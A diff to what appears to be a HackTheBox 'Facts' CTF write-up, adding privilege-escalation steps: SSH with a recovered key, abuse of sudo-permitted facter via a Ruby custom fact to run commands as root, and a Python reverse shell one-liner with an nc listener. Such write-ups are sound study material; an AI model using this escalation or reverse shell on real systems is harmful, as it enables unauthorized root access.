@@ -80,7 +80,7 @@ The backend accepts arbitrary parameters submitted by the user, allowing privile
 
 After modifying the request, I gained administrative privileges and obtained access to advanced CMS configuration options.
 
-![adminsucessful](screenshots/adminsucessful.png)
+![adminsucessful](screenshots/adminsuccessful.png)
 
 ---
 ## Acess AWS S3
@@ -138,9 +138,14 @@ After generating the wordlist, I executed the enumeration script to identify a v
 ---
 ## Privilege Escalation
 
-After login we enumerate the server for get useful information:
+After identifying the valid user, I authenticated via SSH using the recovered private key and passphrase.
+```bash 
+ssh -i id_ed25519 trivia@facts.htb
+```
 
-when we try the command sudo -l we get the next information
+Once authenticated, I performed local enumeration to identify privilege escalation vectors.
+
+Checking the user's sudo permissions revealed the following:
 
 ```bash 
 trivia@facts:~$ sudo -l
@@ -153,10 +158,41 @@ User trivia may run the following commands on facts:
 
 ```
 
-Inspecting the file facter we see:
+Inspecting the `facter` documentation and available command-line options revealed support for loading custom facts from external directories.
 
 ![facter](screenshots/facter.png)
 
-[Facter](https://help.puppet.com/core/current/Content/PuppetCore/Markdown/cli.htm) is a library written in ruby used for report system information such as memory, IP, MAC, mounted disks, etc.
+[Facter](https://help.puppet.com/core/current/Content/PuppetCore/Markdown/cli.htm) is a library written in ruby used to gather system information such as memory statistics, network interfaces, mounted disks, etc.
 
+Because `facter` allows us to load [custom facts](https://help.puppet.com/core/current/Content/PuppetCore/custom_facts.htm) in external directories I created a custom fact that executes a shell command.
 
+``` ruby
+Facter.add('custom_fact') do
+  setcode do
+    Facter::Core::Execution.execute('id')
+  end
+end
+```
+
+And we execute the fact using the next command 
+
+```bash 
+trivia@facts:~$ sudo facter --custom-dir=../trivia custom_fact
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+After confirming code execution as root, I modified the payload to establish a reverse shell back to my attacker machine.
+
+```python 
+python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("IP",9090));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'
+```
+
+![python_revshell](/screenshots/python_revshell.png)
+
+and opened a listener on my attacker machine.
+
+```bash 
+➜  Facts nc -lknvp 9090
+```
+
+![root_shell](/screenshots/root_shell.png)
